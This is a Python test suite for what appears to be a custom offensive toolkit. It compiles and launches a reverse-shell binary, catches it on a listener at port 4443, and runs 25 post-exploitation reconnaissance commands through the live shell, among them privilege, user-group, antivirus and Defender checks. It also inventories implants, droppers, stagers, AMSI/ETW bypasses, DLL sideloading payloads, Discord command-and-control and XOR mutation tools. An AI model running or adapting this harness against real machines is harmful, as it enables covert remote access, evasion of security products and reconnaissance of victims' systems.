#!/usr/bin/env python3
"""
iron_sun_suite.py — IRON-SUN Automated Test Suite
22DIV / rainfantry — run on any authorized machine

PHASES:
  1  ENVIRONMENT    — Python, gcc, git, PATH validation
  2  SYNTAX         — All .py files parse clean
  3  DESIGNATE      — Callsign generation
  4  SHELL          — iron_sun loopback TCP + ISUN magic gate
  5  RECON          — 25-command enumeration via live shell
  6  TOOL STATUS    — deploy.py binary scanner (what's compiled)
  7  MUTATION       — mutate.py key status
  8  REPORT         — Save full results to docs/SUITE_REPORT_<date>.md

Usage:
    python iron_sun_suite.py               # Full suite
    python iron_sun_suite.py --phase 4     # Single phase
    python iron_sun_suite.py --no-shell    # Skip shell test (no compile needed)
    python iron_sun_suite.py --recompile   # Force recompile iron_sun.exe first
"""

import sys, os, socket, threading, subprocess, time, datetime, shutil, argparse, hashlib, platform

# ── stdout UTF-8 ──────────────────────────────────────────────────────────────
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        os.environ.setdefault("PYTHONIOENCODING", "utf-8")

HERE   = os.path.dirname(os.path.abspath(__file__))
DOCS   = os.path.join(HERE, "docs")
os.makedirs(DOCS, exist_ok=True)

# ── Colors ────────────────────────────────────────────────────────────────────
_IDF  = "\033[38;2;0;56;184m"
_GOLD = "\033[38;2;255;215;0m"
_GRN  = "\033[38;2;0;255;100m"
_RED  = "\033[38;2;255;60;60m"
_CY   = "\033[38;2;0;229;255m"
_WH   = "\033[38;2;255;255;255m"
_DIM  = "\033[38;2;120;120;120m"
_RS   = "\033[0m"

W = 66; C = W // 2

# ── Global results store ──────────────────────────────────────────────────────
RESULTS = []   # list of (phase, test_name, passed, detail)
START_TIME = datetime.datetime.now()

# ═══════════════════════════════════════════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════════════════════════════════════════

def print_banner():
    rows = []
    for r in range(15):
        h = int(round(C * (14 - r) / 14))
        if h == 0:
            ln = [' '] * W; ln[C] = '✡'; rows.append(''.join(ln)); break
        ln = [' '] * W
        for i in range(17):
            p = int(round(C + (-1.0 + i * 0.125) * h))
            p = max(0, min(W - 1, p))
            ln[p] = '│' if abs(p - C) <= 1 else ('╲' if p < C else '╱')
        rows.append(''.join(ln))
    print()
    print(f"  {_CY}╔{'═'*W}╗")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    for row in rows:
        print(f"  ║{_GOLD}{row.ljust(W)[:W]}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_WH}{'T H E   I R O N - S U N'.center(W)}{_CY}║")
    print(f"  ║{_WH}{'A U S T R A L I A N   A R M Y   ·   2 2 D I V'.center(W)}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ╚{'═'*W}╝{_RS}")
    print()
    print(f"  {_CY}IRON-SUN AUTOMATED TEST SUITE{_RS}")
    print(f"  {_DIM}{START_TIME.strftime('%Y-%m-%d %H:%M:%S')}  ·  {platform.node()}{_RS}")
    print()

# ═══════════════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def phase_header(num, name):
    print(f"\n  {_CY}{'─'*W}{_RS}")
    print(f"  {_GOLD}PHASE {num}{_RS}  {_WH}{name}{_RS}")
    print(f"  {_CY}{'─'*W}{_RS}\n")

def ok(phase, name, detail=""):
    RESULTS.append((phase, name, True, detail))
    tag = f"{_GRN}PASS{_RS}"
    d   = f"  {_DIM}{detail}{_RS}" if detail else ""
    print(f"  {tag}  {name}{d}")

def warn(phase, name, detail=""):
    """Non-blocking notice — recorded but NOT counted as FAIL."""
    RESULTS.append((phase, name, None, detail))   # None = warn (not bool)
    tag = f"\033[38;2;255;165;0mWARN{_RS}"
    d   = f"  {_DIM}{detail}{_RS}" if detail else ""
    print(f"  {tag}  {name}{d}")

def fail(phase, name, detail=""):
    RESULTS.append((phase, name, False, detail))
    tag = f"{_RED}FAIL{_RS}"
    d   = f"  {_DIM}{detail}{_RS}" if detail else ""
    print(f"  {tag}  {name}{d}")

def info(msg):
    print(f"  {_DIM}{msg}{_RS}")

def run(cmd, timeout=30, cwd=HERE):
    """Run shell command, return (returncode, stdout+stderr)."""
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, cwd=cwd, errors='replace'
        )
        return r.returncode, (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

def which(name):
    return shutil.which(name) is not None

def file_exists(rel):
    return os.path.isfile(os.path.join(HERE, rel))

def dir_exists(rel):
    return os.path.isdir(os.path.join(HERE, rel))

def file_size(rel):
    p = os.path.join(HERE, rel)
    return os.path.getsize(p) if os.path.isfile(p) else 0

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1 — ENVIRONMENT
# ═══════════════════════════════════════════════════════════════════════════════

def phase_environment():
    P = 1; phase_header(P, "ENVIRONMENT CHECK")

    # Python version
    pv = sys.version.split()[0]
    if sys.version_info >= (3, 8):
        ok(P, f"Python {pv}", sys.executable)
    else:
        fail(P, f"Python {pv} — need 3.8+")

    # gcc
    rc, out = run("gcc --version")
    if rc == 0:
        ver = out.splitlines()[0] if out else "?"
        ok(P, "gcc available", ver[:60])
    else:
        fail(P, "gcc not found — iron_sun.exe cannot be compiled")

    # git
    rc, out = run("git --version")
    if rc == 0:
        ok(P, "git available", out.strip()[:50])
    else:
        fail(P, "git not found")

    # gh (GitHub CLI) — optional
    rc, out = run("gh --version")
    ok(P, "gh CLI available", out.splitlines()[0][:50]) if rc == 0 else info("gh not found (optional — designate --create needs it)")

    # iron_sun.c source exists
    if file_exists("shell/iron_sun.c"):
        ok(P, "shell/iron_sun.c present", f"{file_size('shell/iron_sun.c')} bytes")
    else:
        fail(P, "shell/iron_sun.c MISSING")

    # iron_sun.exe compiled
    if file_exists("iron_sun.exe"):
        ok(P, "iron_sun.exe compiled", f"{file_size('iron_sun.exe')} bytes")
    else:
        fail(P, "iron_sun.exe not compiled — run: gcc shell/iron_sun.c -o iron_sun.exe -lws2_32 -include ws2tcpip.h -D_WIN32_WINNT=0x0600")

    # vader_listener.py
    if file_exists("shell/vader_listener.py"):
        ok(P, "shell/vader_listener.py present")
    else:
        fail(P, "shell/vader_listener.py MISSING")

    # Key Python modules
    for mod in ["socket", "threading", "subprocess", "hashlib"]:
        try:
            __import__(mod)
            ok(P, f"import {mod}")
        except ImportError:
            fail(P, f"import {mod} MISSING")

    # cheyanne directory structure
    for d in ["shell", "agent", "docs", "recon"]:
        if dir_exists(d):
            ok(P, f"dir/{d} exists")
        else:
            fail(P, f"dir/{d} MISSING")

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2 — SYNTAX CHECK ALL PYTHON FILES
# ═══════════════════════════════════════════════════════════════════════════════

def phase_syntax():
    P = 2; phase_header(P, "PYTHON SYNTAX CHECK — ALL .py FILES")

    py_files = []
    for root, dirs, files in os.walk(HERE):
        dirs[:] = [d for d in dirs if not d.startswith('.') and d not in ['__pycache__', 'node_modules']]
        for f in files:
            if f.endswith('.py'):
                py_files.append(os.path.relpath(os.path.join(root, f), HERE))

    passed = 0; failed = 0
    for rel in sorted(py_files):
        rc, out = run(f'python -m py_compile "{rel}"')
        if rc == 0:
            ok(P, rel)
            passed += 1
        else:
            fail(P, rel, out[:120])
            failed += 1

    print()
    info(f"Syntax check: {passed} passed, {failed} failed — {len(py_files)} total files")

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3 — DESIGNATE (callsign generation)
# ═══════════════════════════════════════════════════════════════════════════════

def phase_designate():
    P = 3; phase_header(P, "DESIGNATE — CALLSIGN GENERATION")

    if not file_exists("designate.py"):
        fail(P, "designate.py not found"); return

    rc, out = run("python designate.py", timeout=15)
    if rc == 0:
        ok(P, "designate.py runs clean")
        for line in out.splitlines():
            if line.strip():
                info(line)
        # Extract callsign line
        for line in out.splitlines():
            if "callsign" in line.lower() or "·" in line or "--" in line:
                ok(P, f"Callsign generated: {line.strip()[:60]}")
    else:
        fail(P, "designate.py failed", out[:200])

    # SHA256 fingerprint of this machine
    hostname = platform.node()
    ts       = START_TIME.strftime("%Y-%m-%d-%H")
    fp       = hashlib.sha256(f"{hostname}{ts}".encode()).hexdigest()[:16]
    ok(P, f"Machine fingerprint", f"{hostname} → {fp}")

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 4 — IRON SUN SHELL (loopback TCP)
# ═══════════════════════════════════════════════════════════════════════════════

MAGIC      = bytes([0x49, 0x53, 0x55, 0x4E])
SHELL_CONN = [None]
SHELL_EVT  = threading.Event()

def _listener_thread():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 4443))   # all interfaces — accepts loopback OR LAN IP
        srv.listen(1)
        srv.settimeout(75)
        conn, addr = srv.accept()
        SHELL_CONN[0] = conn
        conn.send(MAGIC)
        SHELL_EVT.set()
    except Exception as e:
        SHELL_EVT.set()
    finally:
        try: srv.close()
        except: pass

def _recv(conn, timeout=10):
    """Recv until cmd.exe prompt detected OR deadline expires.

    Prompt detection prevents the deadlock where leftover output from
    a large command (route print, netstat -an) fills iron_sun's send buffer
    before the next command's response arrives. We drain fully each time.
    """
    conn.settimeout(0.4)
    data = b""; deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            chunk = conn.recv(16384)
            if not chunk:   # TCP FIN — connection closed
                break
            data += chunk
            # Cmd.exe prompt ends lines with ">" — detect to stop early
            text = data.decode(errors='replace')
            last = text.rstrip()
            if last and last[-1] == '>':
                # Confirm it looks like a real prompt, not just a > in output
                last_line = last.splitlines()[-1].strip()
                if last_line.endswith('>') and (':\\' in last_line or last_line.startswith('C>')):
                    break
        except socket.timeout:
            # Exit only once we have data AND have been quiet for ≥1s near deadline
            if data and time.time() > deadline - 1:
                break
    return data.decode(errors='replace')

def _cmd(conn, cmd, timeout=12):
    conn.send((cmd + "\r\n").encode())
    return _recv(conn, timeout)

def phase_shell():
    P = 4; phase_header(P, "IRON SUN SHELL — TCP REVERSE SHELL TEST (0.0.0.0:4443)")

    iron = os.path.join(HERE, "iron_sun.exe")
    if not os.path.isfile(iron):
        fail(P, "iron_sun.exe not found — compile first"); return

    t = threading.Thread(target=_listener_thread, daemon=True)
    t.start()
    time.sleep(0.3)

    # Detect what IP the binary is targeting (decode xC2Addr from source)
    lan_ip = socket.gethostbyname(socket.gethostname())
    info(f"Starting listener 0.0.0.0:4443 (LAN: {lan_ip}) ...")
    info("Launching iron_sun.exe (anti-sandbox sleep: ~5-8s)...")

    proc = subprocess.Popen([iron], creationflags=subprocess.CREATE_NO_WINDOW)
    ok(P, "iron_sun.exe launched", f"PID {proc.pid}")

    SHELL_EVT.wait(timeout=80)

    conn = SHELL_CONN[0]
    if not conn:
        fail(P, "No connection — iron_sun.exe did not call back")
        proc.terminate()
        return

    ok(P, "TCP connection established — ISUN magic sent")
    time.sleep(0.6)
    _recv(conn, timeout=3)   # drain cmd.exe banner

    # Verify shell is live
    out = _cmd(conn, "echo IRON_SUN_GATE_OPEN", timeout=6)
    if "IRON_SUN_GATE_OPEN" in out:
        ok(P, "cmd.exe shell responding", "echo test passed")
    else:
        fail(P, "Shell not responding to echo", out[:80])

    # Store conn for phase 5
    SHELL_CONN[0] = conn
    SHELL_CONN.append(proc)

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 5 — RECON SUITE (25 commands via live shell)
# ═══════════════════════════════════════════════════════════════════════════════

RECON_COMMANDS = [
    # Identity
    ("whoami",              "whoami",                                             4),
    ("whoami /groups",      "whoami /groups",                                    10),
    ("whoami /priv",        "whoami /priv",                                       8),
    ("hostname",            "hostname",                                            4),
    # OS
    ("OS name+ver",         'systeminfo | findstr /C:"OS Name" /C:"OS Version"',  8),
    ("system type+RAM",     'systeminfo | findstr /C:"System Type" /C:"Total Physical" /C:"Processor"', 10),
    ("BIOS",                'systeminfo | findstr /C:"BIOS"',                      8),
    ("domain",              'systeminfo | findstr /C:"Domain"',                    8),
    # Network
    ("ipconfig",            "ipconfig",                                           10),
    ("arp table",           "arp -a",                                              8),
    ("routing table",       "route print",                                        10),
    ("netstat LISTEN",      "netstat -an | findstr LISTEN",                        8),
    ("netstat ESTABLISHED", "netstat -an | findstr ESTABLISHED",                   8),
    ("firewall state",      "netsh advfirewall show allprofiles state",            8),
    # Users & groups
    ("local users",         "net user",                                            6),
    ("local groups",        "net localgroup",                                      6),
    ("admins",              "net localgroup Administrators",                       6),
    # Processes & services
    ("process list",        "tasklist /fo csv /nh",                               12),
    ("services",            'sc query type= all state= all | findstr "SERVICE_NAME RUNNING"', 12),
    # AV & security
    ("AV products",         r'wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState /format:list', 10),
    ("Defender status",     "powershell -NoP -C \"Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled | Format-List\"", 12),
    # Filesystem
    ("drives",              "wmic logicaldisk get caption,description,size,freespace /format:list", 8),
    ("users dir",           "dir C:\\Users\\",                                    8),
    ("temp dir",            "dir %TEMP%",                                         8),
    # Environment
    ("env vars",            "set",                                                 8),
]

def phase_recon():
    P = 5; phase_header(P, "RECON SUITE — 25 COMMANDS VIA IRON SUN SHELL")

    conn = SHELL_CONN[0] if SHELL_CONN else None
    if not conn:
        fail(P, "No shell connection — phase 4 must pass first"); return

    recon_log = {}
    ts = START_TIME.strftime("%Y-%m-%d %H:%M:%S")

    for label, cmd, timeout in RECON_COMMANDS:
        try:
            out = _cmd(conn, cmd, timeout=timeout)
            lines = [l for l in out.splitlines() if l.strip()]
            recon_log[label] = "\n".join(lines)
            if lines:
                ok(P, label, lines[0][:70] if lines else "")
            else:
                fail(P, label, "no output")
        except Exception as e:
            fail(P, label, str(e)[:80])
            recon_log[label] = f"ERROR: {e}"

    # Save full recon to docs/
    report_path = os.path.join(DOCS, f"SUITE_RECON_{START_TIME.strftime('%Y%m%d_%H%M%S')}.md")
    with open(report_path, "w", encoding="utf-8") as f:
        f.write(f"# IRON-SUN SUITE RECON — {ts}\n")
        f.write(f"# Machine: {platform.node()} | Python: {sys.version.split()[0]}\n\n")
        for label, output in recon_log.items():
            f.write(f"\n## {label}\n```\n{output}\n```\n")
    ok(P, f"Full recon saved", report_path)

    # Terminate shell
    try:
        conn.send(b"exit\r\n")
        conn.close()
    except: pass
    if len(SHELL_CONN) > 1 and SHELL_CONN[1]:
        try: SHELL_CONN[1].terminate()
        except: pass

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 6 — TOOL STATUS (what's compiled in cheyanne)
# ═══════════════════════════════════════════════════════════════════════════════

TOOL_BINARIES = [
    ("iron_sun.exe",                    "iron_sun.exe"),
    ("vader_shell.exe",                 "shell/vader_shell.exe"),
    ("dark_room.exe",                   "dark_room/dark_room.exe"),
    ("vader_inject.exe",                "injection/vader_inject.exe"),
    ("vader_inject.dll",                "injection/vader_inject.dll"),
    ("cloak.dll",                       "cloak/bin/cloak.dll"),
    ("cloak_loader.exe",                "cloak/bin/cloak_loader.exe"),
    ("vader_dropper.exe",               "cloak/bin/vader_dropper.exe"),
    ("vader_stager.exe",                "stagers/vader_stager.exe"),
    ("vader_clean.exe",                 "forensics/vader_clean.exe"),
    ("amsi_hwbp.exe",                   "amsi/amsi_hwbp.exe"),
    ("etw_hwbp.exe",                    "etw/etw_hwbp.exe"),
    ("svc_replace.exe (V4)",            "sideload/svc_replace.exe"),
    ("VERSION.dll (V5)",                "sideload/VERSION.dll"),
    ("targetname.dll (V6)",             "sideload/targetname.dll"),
    ("osppc.dll (V7)",                  "sideload/osppc.dll"),
]

TOOL_SCRIPTS = [
    ("vader_menu.py",           "vader_menu.py"),
    ("vader_ui.py",             "vader_ui.py"),
    ("vader_c2_v2.py",          "shell/vader_c2_v2.py"),
    ("vader_listener.py",       "shell/vader_listener.py"),
    ("deploy.py",               "deploy.py"),
    ("mutate.py",               "mutate.py"),
    ("metamorph.py",            "metamorph.py"),
    ("designate.py",            "designate.py"),
    ("cheyanne_ops.py",         "cheyanne_ops.py"),
    ("cheyanne_agent.py",       "cheyanne_agent.py"),
    ("discord_implant.py",      "agent/discord_implant.py"),
    ("discord_c2.py",           "agent/discord_c2.py"),
    ("vader_recon.ps1",         "recon/vader_recon.ps1"),
    ("live_test.py",            "live_test.py"),
    ("iron_sun_suite.py",       "iron_sun_suite.py"),
    ("test_verify.py",          "test_verify.py"),
]

def phase_tool_status():
    P = 6; phase_header(P, "TOOL STATUS — CHEYANNE ARSENAL INVENTORY")

    print(f"  {_WH}── COMPILED BINARIES ──────────────────────────────────{_RS}\n")
    built = 0; missing = 0
    for name, rel in TOOL_BINARIES:
        if file_exists(rel):
            sz = file_size(rel)
            ok(P, name, f"{sz//1024}KB  {os.path.join(HERE, rel)}")
            built += 1
        else:
            warn(P, name, f"not compiled yet  →  {rel}")
            missing += 1

    print(f"\n  {_WH}── PYTHON SCRIPTS ──────────────────────────────────────{_RS}\n")
    for name, rel in TOOL_SCRIPTS:
        if file_exists(rel):
            ok(P, name, rel)
        else:
            fail(P, name, f"MISSING  →  {rel}")

    print()
    info(f"Binaries: {built}/{len(TOOL_BINARIES)} built  ·  {missing} need compilation")

    # Run deploy.py --status if it exists
    if file_exists("deploy.py"):
        rc, out = run("python deploy.py --status", timeout=20)
        if rc == 0 and out:
            print(f"\n  {_WH}── deploy.py --status ──────────────────────────────────{_RS}\n")
            for line in out.splitlines()[:30]:
                info(line)
            ok(P, "deploy.py --status")
        else:
            info(f"deploy.py --status: rc={rc}")

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 7 — MUTATION STATUS
# ═══════════════════════════════════════════════════════════════════════════════

def phase_mutation():
    P = 7; phase_header(P, "MUTATION STATUS — XOR KEYS + METAMORPH")

    if file_exists("mutate.py"):
        rc, out = run("python mutate.py --status", timeout=15)
        if rc == 0:
            ok(P, "mutate.py --status")
            for line in out.splitlines()[:20]:
                info(line)
        else:
            info(f"mutate.py --status not implemented or errored (rc={rc})")
            info(out[:200] if out else "")
    else:
        fail(P, "mutate.py not found")

    if file_exists("metamorph.py"):
        rc, out = run("python metamorph.py --dry-run", timeout=15)
        if rc == 0:
            ok(P, "metamorph.py --dry-run")
            for line in out.splitlines()[:10]:
                info(line)
        else:
            info(f"metamorph.py --dry-run: rc={rc}")
    else:
        fail(P, "metamorph.py not found")

    # Check XOR key in iron_sun.c
    src = os.path.join(HERE, "shell/iron_sun.c")
    if os.path.isfile(src):
        with open(src, encoding='utf-8', errors='replace') as f:
            content = f.read()
        for line in content.splitlines():
            if "#define XK" in line or "#define XOR_KEY" in line:
                ok(P, f"iron_sun.c XOR key", line.strip())
                break

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 8 — REPORT
# ═══════════════════════════════════════════════════════════════════════════════

def phase_report():
    P = 8; phase_header(P, "SUITE REPORT")

    passed  = sum(1 for r in RESULTS if r[2] is True)
    failed  = sum(1 for r in RESULTS if r[2] is False)
    warned  = sum(1 for r in RESULTS if r[2] is None)
    total   = passed + failed   # warns don't count against total
    dur     = (datetime.datetime.now() - START_TIME).total_seconds()

    print(f"  {_WH}Results:  {_GRN}{passed} PASSED{_RS}  {_RED}{failed} FAILED{_RS}  \033[38;2;255;165;0m{warned} WARN{_RS}  of {total} tests")
    print(f"  {_WH}Duration: {dur:.1f}s{_RS}")
    print(f"  {_WH}Machine:  {platform.node()}{_RS}")
    print(f"  {_WH}Time:     {START_TIME.strftime('%Y-%m-%d %H:%M:%S')}{_RS}")
    print()

    # Write markdown report
    ts = START_TIME.strftime("%Y%m%d_%H%M%S")
    rpt = os.path.join(DOCS, f"SUITE_REPORT_{ts}.md")

    with open(rpt, "w", encoding="utf-8") as f:
        f.write(f"# IRON-SUN SUITE REPORT\n\n")
        f.write(f"**Date:** {START_TIME.strftime('%Y-%m-%d %H:%M:%S')}  \n")
        f.write(f"**Machine:** {platform.node()}  \n")
        f.write(f"**OS:** {platform.system()} {platform.release()} {platform.version()[:40]}  \n")
        f.write(f"**Python:** {sys.version.split()[0]}  \n")
        f.write(f"**Results:** {passed}/{total} passed ({failed} failed)  \n")
        f.write(f"**Duration:** {dur:.1f}s  \n\n")
        f.write(f"## Test Results\n\n")
        f.write(f"| Phase | Test | Result | Detail |\n|---|---|---|---|\n")

        current_phase = None
        for (phase, name, passed_b, detail) in RESULTS:
            if phase != current_phase:
                current_phase = phase
            icon = "✅" if passed_b is True else ("⚠️" if passed_b is None else "❌")
            d    = detail.replace("|", "\\|")[:80]
            f.write(f"| {phase} | {name} | {icon} | {d} |\n")

        f.write(f"\n## Failed Tests\n\n")
        fails = [(p,n,d) for (p,n,b,d) in RESULTS if b is False]
        if fails:
            for p,n,d in fails:
                f.write(f"- **Phase {p} — {n}**: {d}\n")
        else:
            f.write("All tests passed.\n")

        warns = [(p,n,d) for (p,n,b,d) in RESULTS if b is None]
        if warns:
            f.write(f"\n## Warnings (not counted as failures)\n\n")
            for p,n,d in warns:
                f.write(f"- Phase {p} — {n}: {d}\n")

    ok(P, f"Report saved", rpt)
    print()
    print(f"  {_CY}{'═'*W}{_RS}")
    if failed == 0:
        print(f"  {_GRN}ALL {total} TESTS PASSED{_RS}  {_DIM}({warned} pending builds — see WARN){_RS}")
    else:
        print(f"  {_RED}{failed} TESTS FAILED  —  see report for details{_RS}")
    print(f"  {_CY}{'═'*W}{_RS}\n")

    return failed

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(description="IRON-SUN Automated Test Suite")
    ap.add_argument("--phase",     type=int, help="Run only this phase number")
    ap.add_argument("--no-shell",  action="store_true", help="Skip phases 4+5 (no iron_sun.exe needed)")
    ap.add_argument("--recompile", action="store_true", help="Force recompile iron_sun.exe with loopback IP before testing")
    args = ap.parse_args()

    print_banner()

    if args.recompile:
        info("Recompiling iron_sun.exe (127.0.0.1 loopback)...")
        rc, out = run(
            "gcc shell/iron_sun.c -o iron_sun.exe -lws2_32 -include ws2tcpip.h -D_WIN32_WINNT=0x0600",
            timeout=60
        )
        if rc == 0:
            print(f"  {_GRN}Compile OK{_RS}  {file_size('iron_sun.exe')} bytes")
        else:
            print(f"  {_RED}Compile FAILED{_RS}  {out[:200]}")
            sys.exit(1)
        print()

    phases = {
        1: phase_environment,
        2: phase_syntax,
        3: phase_designate,
        4: phase_shell,
        5: phase_recon,
        6: phase_tool_status,
        7: phase_mutation,
        8: phase_report,
    }

    skip_shell = args.no_shell
    only = args.phase

    for num, fn in phases.items():
        if only and num != only and not (only == 8 and num == 8):
            continue
        if skip_shell and num in (4, 5):
            info(f"Skipping phase {num} (--no-shell)")
            continue
        fn()

    if not only:
        sys.exit(phase_report() > 0)

if __name__ == "__main__":
    main()
